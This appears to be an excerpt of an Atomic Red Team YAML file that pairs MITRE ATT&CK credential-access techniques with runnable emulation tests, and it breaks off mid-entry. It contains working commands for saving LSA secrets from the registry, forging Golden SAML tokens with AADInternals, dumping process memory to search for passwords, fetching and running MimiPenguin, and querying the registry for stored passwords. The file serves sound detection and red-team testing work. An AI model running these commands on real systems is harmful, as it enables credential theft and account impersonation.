        Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)

        [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Monitor processes and command-line arguments for program
        execution that may be indicative of credential dumping. Remote access tools
        may contain built-in features or incorporate existing tools like Mimikatz.
        PowerShell scripts also exist that contain credential dumping functionality,
        such as PowerSploit''s Invoke-Mimikatz module,(Citation: Powersploit) which
        may require additional logging features to be configured in the operating
        system to collect necessary information for analysis.'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Access'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - SYSTEM
      identifier: T1003.004
    atomic_tests:
    - name: Dumping LSA Secrets
      auto_generated_guid: 55295ab0-a703-433b-9ca4-ae13807de12f
      description: |
        Dump secrets key from Windows registry
        When successful, the dumped file will be written to $env:Temp\secrets.
        Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
        https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.
      supported_platforms:
      - windows
      input_arguments:
        psexec_exe:
          description: Path to PsExec executable
          type: path
          default: PathToAtomicsFolder\T1003.004\bin\PsExec.exe
      dependency_executor_name: powershell
      dependencies:
      - description: PsExec from Sysinternals must exist on disk at specified location
          (#{psexec_exe})
        prereq_command: 'if (Test-Path #{psexec_exe}) {exit 0} else {exit 1}'
        get_prereq_command: |-
          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
          Expand-Archive $env:TEMP\PSTools.zip $env:TEMP\PSTools -Force
          New-Item -ItemType Directory (Split-Path #{psexec_exe}) -Force | Out-Null
          Copy-Item $env:TEMP\PSTools\PsExec.exe #{psexec_exe} -Force
      executor:
        command: "#{psexec_exe} -accepteula -s reg save HKLM\\security\\policy\\secrets
          %temp%\\secrets /y"
        cleanup_command: del %temp%\secrets >nul 2> nul
        name: command_prompt
        elevation_required: true
  T1606.002:
    technique:
      x_mitre_platforms:
      - Azure AD
      - SaaS
      - Windows
      - Office 365
      - Google Workspace
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jen Burns, HubSpot
      - Blake Strom, Microsoft 365 Defender
      - Oleg Kolesnikov, Securonix
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2
      type: attack-pattern
      created: '2020-12-17T15:24:12.240Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1606.002
        url: https://attack.mitre.org/techniques/T1606/002
      - source_name: Microsoft SolarWinds Steps
        url: https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/
        description: Lambert, J. (2020, December 13). Important steps for customers
          to protect themselves from recent nation-state cyberattacks. Retrieved December
          17, 2020.
      - source_name: Microsoft SAML Token Lifetimes
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-configurable-token-lifetimes
        description: Microsoft. (2020, December 14). Configurable token lifetimes
          in Microsoft Identity Platform. Retrieved December 22, 2020.
      - source_name: Cyberark Golden SAML
        url: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps
        description: 'Reiner, S. (2017, November 21). Golden SAML: Newly Discovered
          Attack Technique Forges Authentication to Cloud Apps. Retrieved December
          17, 2020.'
      - source_name: Microsoft SolarWinds Customer Guidance
        url: https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/
        description: MSRC. (2020, December 13). Customer Guidance on Recent Nation-State
          Cyber Attacks. Retrieved December 17, 2020.
      - source_name: Sygnia Golden SAML
        url: https://www.sygnia.co/golden-saml-advisory
        description: Sygnia. (2020, December). Detection and Hunting of Golden SAML
          Attack. Retrieved January 6, 2021.
      modified: '2021-09-20T16:47:19.173Z'
      name: 'Forge Web Credentials: SAML token'
      description: |-
        An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)

        An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.

        An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)

        Consider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Web Credential: Web Credential Creation'
      - 'Web Credential: Web Credential Usage'
      - 'Logon Session: Logon Session Metadata'
      - 'Logon Session: Logon Session Creation'
      - 'User Account: User Account Authentication'
      x_mitre_permissions_required:
      - Administrator
      identifier: T1606.002
    atomic_tests:
    - name: Golden SAML
      auto_generated_guid: b16a03bc-1089-4dcc-ad98-30fe8f3a2b31
      description: "Forge a \"Golden SAML\" token which allows to impersonate any
        Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need
        the ADFS token signing certificate (see T1552.004 to export it).\nMore info
        here : https://o365blog.com/post/adfs/\n"
      supported_platforms:
      - azure-ad
      input_arguments:
        certificate_path:
          description: Token signing certificate path. See T1552.004 to export it
          type: path
          default: ".\\ADFS_signing.pfx"
        immutable_id:
          description: ImmutableId of the targeted user. It can be obtained with AzureAD
            powershell module; $(Get-AzureADUser -SearchString "username").ImmutableId
          type: string
          default: aehgdqBTZV50DKQZmNJ8mg==
        issuer_uri:
          description: Issuer URI of the ADFS service
          type: string
          default: http://contoso.com/adfs/services/trust/
      dependency_executor_name: powershell
      dependencies:
      - description: 'AADInternals module must be installed.

          '
        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Install-Module -Name AADInternals -Force

          '
      executor:
        command: |
          Import-Module AADInternals -Force
          $saml = New-AADIntSAMLToken -ImmutableID "#{immutable_id}" -PfxFileName "#{certificate_path}" -Issuer "#{issuer_uri}"
          $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
          if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else { Write-Host "`nThe connection failed" }
          Write-Host "End of Golden SAML"
        name: powershell
  T1167:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1167
        url: https://attack.mitre.org/techniques/T1167
      - url: http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain
        description: Juuso Salonen. (2012, September 5). Breaking into the OS X keychain.
          Retrieved July 15, 2017.
        source_name: OS X Keychain
      - url: http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way
        description: Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to
          DA, the OS X Way. Retrieved July 3, 2017.
        source_name: External to DA, the OS X Way
      - url: https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/
        description: Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware
          is hungry for credentials. Retrieved July 3, 2017.
        source_name: OSX Keydnap malware
      modified: '2020-02-12T18:56:59.153Z'
      name: Securityd Memory
      description: |-
        In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple‚Äôs keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple‚Äôs securityd utility takes the user‚Äôs logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user‚Äôs password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)

        If an adversary can obtain root access (allowing them to read securityd‚Äôs memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user‚Äôs logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - root
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1214:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Sudhanshu Chauhan, @Sudhanshu_C
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--2edd9d6a-5674-4326-a600-ba56de467286
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1214
        url: https://attack.mitre.org/techniques/T1214
      - url: https://pentestlab.blog/2017/04/19/stored-credentials/
        description: netbiosX. (2017, April 19). Stored Credentials. Retrieved April
          6, 2018.
        source_name: Pentestlab Stored Credentials
      modified: '2020-02-04T12:59:37.464Z'
      name: Credentials in Registry
      description: |-
        The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

        Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

        * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
        * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor processes for applications that can be used to query
        the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and
        collect command parameters that may indicate credentials are being searched.
        Correlate activity with related suspicious behavior that may indicate an active
        intrusion to reduce false positives.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_system_requirements:
      - Ability to query some Registry locations depends on the adversary's level
        of access. User permissions are usually limited to access of user-related
        Registry keys.
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1003.007:
    technique:
      modified: '2023-04-15T01:16:25.566Z'
      name: 'OS Credential Dumping: Proc Filesystem'
      description: |-
        Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process‚Äôs virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process‚Äôs virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)

        When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process‚Äôs memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)

        If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Tim (Wadhwa-)Brown
      x_mitre_deprecated: false
      x_mitre_detection: To obtain the passwords and hashes stored in memory, processes
        must open a maps file in the /proc filesystem for the process being analyzed.
        This file is stored under the path <code>/proc/\*/maps</code>, where the <code>\*</code>
        directory is the unique pid of the program being interrogated for such authentication
        data. The AuditD monitoring tool, which ships stock in many Linux distributions,
        can be used to watch for hostile processes opening this file in the proc file
        system, alerting on the pid, process name, and arguments of such programs.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      type: attack-pattern
      id: attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d
      created: '2020-02-11T18:46:24.434Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1003/007
        external_id: T1003.007
      - source_name: baeldung Linux proc map 2022
        description: baeldung. (2022, April 8). Understanding the Linux /proc/id/maps
          File. Retrieved March 31, 2023.
        url: https://www.baeldung.com/linux/proc-id-maps
      - source_name: Polop Linux PrivEsc Gitbook
        description: Carlos Polop. (2023, March 5). Linux Privilege Escalation. Retrieved
          March 31, 2023.
        url: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-usdpid-maps-and-proc-usdpid-mem
      - source_name: MimiPenguin GitHub May 2017
        description: Gregal, H. (2017, May 12). MimiPenguin. Retrieved December 5,
          2017.
        url: https://github.com/huntergregal/mimipenguin
      - source_name: Picus Labs Proc cump 2022
        description: Huseyin Can YUCEEL & Picus Labs. (2022, March 22). Retrieved
          March 31, 2023.
        url: https://www.picussecurity.com/resource/the-mitre-attck-t1003-os-credential-dumping-technique-and-its-adversary-use
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1003.007
    atomic_tests:
    - name: Dump individual process memory with sh (Local)
      auto_generated_guid: 7e91138a-8e74-456d-a007-973d67a0bb80
      description: |
        Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
        copy process memory to an external file so it can be searched or exfiltrated later.
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.007.bin"
        script_path:
          description: Path to script generating the target process
          type: path
          default: "/tmp/T1003.007.sh"
        pid_term:
          description: Unique string to use to identify target process
          type: string
          default: T1003.007
      dependencies:
      - description: 'Script to launch target process must exist

          '
        prereq_command: |
          test -f #{script_path}
          grep "#{pid_term}" #{script_path}
        get_prereq_command: |
          echo '#!/bin/sh' > #{script_path}
          echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
      executor:
        name: sh
        elevation_required: true
        command: |
          sh #{script_path}
          PID=$(pgrep -n -f "#{pid_term}")
          HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
          MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
          MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
          MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
          dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
          grep -i "PASS" "#{output_file}"
        cleanup_command: 'rm -f "#{output_file}"

          '
    - name: Dump individual process memory with Python (Local)
      auto_generated_guid: 437b2003-a20d-4ed8-834c-4964f24eec63
      description: |
        Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
        copy a process's heap memory to an external file so it can be searched or exfiltrated later.
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.007.bin"
        script_path:
          description: Path to script generating the target process
          type: path
          default: "/tmp/T1003.007.sh"
        python_script:
          description: Path to script generating the target process
          type: path
          default: PathToAtomicsFolder/T1003.007/src/dump_heap.py
        pid_term:
          description: Unique string to use to identify target process
          type: string
          default: T1003.007
      dependencies:
      - description: 'Script to launch target process must exist

          '
        prereq_command: |
          test -f #{script_path}
          grep "#{pid_term}" #{script_path}
        get_prereq_command: |
          echo '#!/bin/sh' > #{script_path}
          echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
      - description: 'Requires Python

          '
        prereq_command: "(which python || which python3 || which python2)\n"
        get_prereq_command: 'echo "Python 2.7+ or 3.4+ must be installed"

          '
      executor:
        name: sh
        elevation_required: true
        command: |
          sh #{script_path}
          PID=$(pgrep -n -f "#{pid_term}")
          PYTHON=$(which python || which python3 || which python2)
          $PYTHON #{python_script} $PID #{output_file}
          grep -i "PASS" "#{output_file}"
        cleanup_command: 'rm -f "#{output_file}"

          '
    - name: Capture Passwords with MimiPenguin
      auto_generated_guid: a27418de-bdce-4ebd-b655-38f04842bf0c
      description: "MimiPenguin is a tool inspired by MimiKatz that targets Linux
        systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions
        of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin
        will retrieve passwords from memory and output them to a specified file. \nSee
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n"
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1003.007Test3.txt"
        MimiPenguin_Location:
          description: Path of MimiPenguin script
          type: path
          default: "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
      dependency_executor_name: sh
      dependencies:
      - description: 'MimiPenguin script must exist on disk at specified location
          (#{MimiPenguin_Location})

          '
        prereq_command: 'if [ -f "#{MimiPenguin_Location}" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: |
          wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
          mkdir /tmp/mimipenguin
          tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
      - description: 'Strings must be installed

          '
        prereq_command: 'if [ -x "$(command -v strings --version)" ]; then exit 0;
          else exit 1; fi;

          '
        get_prereq_command: 'sudo apt-get -y install binutils

          '
      - description: 'Python2 must be installed

          '
        prereq_command: 'if [ -x "$(command -v python2 --version)" ]; then exit 0;
          else exit 1; fi;

          '
        get_prereq_command: "sudo apt-get -y install python2       \n"
      - description: 'Libc-bin must be installed

          '
        prereq_command: 'if [ -x "$(command -v ldd --version)" ]; then exit 0; else
          exit 1; fi;

          '
        get_prereq_command: "sudo apt-get -y install libc-bin        \n"
      executor:
        command: |
          sudo #{MimiPenguin_Location} > #{output_file}
          cat #{output_file}
        cleanup_command: 'rm -f #{output_file} > /dev/null

          '
        name: bash
        elevation_required: true
  T1555.005:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Matt Burrough, @mattburrough, Microsoft
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21
      type: attack-pattern
      created: '2021-01-22T16:08:40.629Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1555.005
        url: https://attack.mitre.org/techniques/T1555/005
      - source_name: ise Password Manager February 2019
        url: https://www.ise.io/casestudies/password-manager-hacking/
        description: 'ise. (2019, February 19). Password Managers: Under the Hood
          of Secrets Management. Retrieved January 22, 2021.'
      - source_name: FoxIT Wocao December 2019
        url: https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf
        description: 'Dantzig, M. v., Schamper, E. (2019, December 19). Operation
          Wocao: Shining a light on one of China‚Äôs hidden hacking groups. Retrieved
          October 8, 2020.'
      - source_name: Github KeeThief
        url: https://github.com/GhostPack/KeeThief
        description: Lee, C., Schoreder, W. (n.d.). KeeThief. Retrieved February 8,
          2021.
      - source_name: NVD CVE-2019-3610
        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3610
        description: National Vulnerability Database. (2019, October 9). CVE-2019-3610
          Detail. Retrieved April 14, 2021.
      - source_name: Cyberreason Anchor December 2019
        url: https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware
        description: 'Dahan, A. et al. (2019, December 11). DROPPING ANCHOR: FROM
          A TRICKBOT INFECTION TO THE DISCOVERY OF THE ANCHOR MALWARE. Retrieved September
          10, 2020.'
      modified: '2022-03-25T13:18:55.310Z'
      name: Password Managers
      description: |-
        Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)

        Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)
         Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: "Consider monitoring API calls, file read events, and processes
        for suspicious activity that could indicate searching in process memory of
        password managers. \n\nConsider monitoring file reads surrounding known password
        manager applications."
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Process: Process Access'
      - 'File: File Access'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1040:
    technique:
      modified: '2023-04-12T23:31:49.085Z'
      name: Network Sniffing
      description: |-
        Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.

        In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)

        On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Oleg Kolesnikov, Securonix
      - Tiago Faria, 3CORESec
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

        In cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      - IaaS
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_system_requirements:
      - Network interface access and packet capture driver
      type: attack-pattern
      id: attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529
      created: '2017-05-31T21:30:41.399Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1040
        external_id: T1040
      - source_name: AWS Traffic Mirroring
        description: Amazon Web Services. (n.d.). How Traffic Mirroring works. Retrieved
          March 17, 2022.
        url: https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html
      - source_name: capture_embedded_packet_on_software
        description: Cisco. (2022, August 17). Configure and Capture Embedded Packet
          on Software. Retrieved July 13, 2022.
        url: https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-embedded-packet-capture/116045-productconfig-epc-00.html
      - source_name: GCP Packet Mirroring
        description: Google Cloud. (n.d.). Packet Mirroring overview. Retrieved March
          17, 2022.
        url: https://cloud.google.com/vpc/docs/packet-mirroring
      - source_name: SpecterOps AWS Traffic Mirroring
        description: Luke Paine. (2020, March 11). Through the Looking Glass ‚Äî Part
          1. Retrieved March 17, 2022.
        url: https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512
      - source_name: Azure Virtual Network TAP
        description: Microsoft. (2022, February 9). Virtual network TAP. Retrieved
          March 17, 2022.
        url: https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview
      - source_name: Rhino Security Labs AWS VPC Traffic Mirroring
        description: Spencer Gietzen. (2019, September 17). Abusing VPC Traffic Mirroring
          in AWS. Retrieved March 17, 2022.
        url: https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1040
    atomic_tests:
    - name: Packet Capture Linux using tshark or tcpdump
      auto_generated_guid: 7fe741f7-b265-4951-a7c7-320889083b3e
      description: |
        Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

        Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.
      supported_platforms:
      - linux
      input_arguments:
        interface:
          description: Specify interface to perform PCAP on.
          type: string
          default: ens33
      dependency_executor_name: bash
      dependencies:
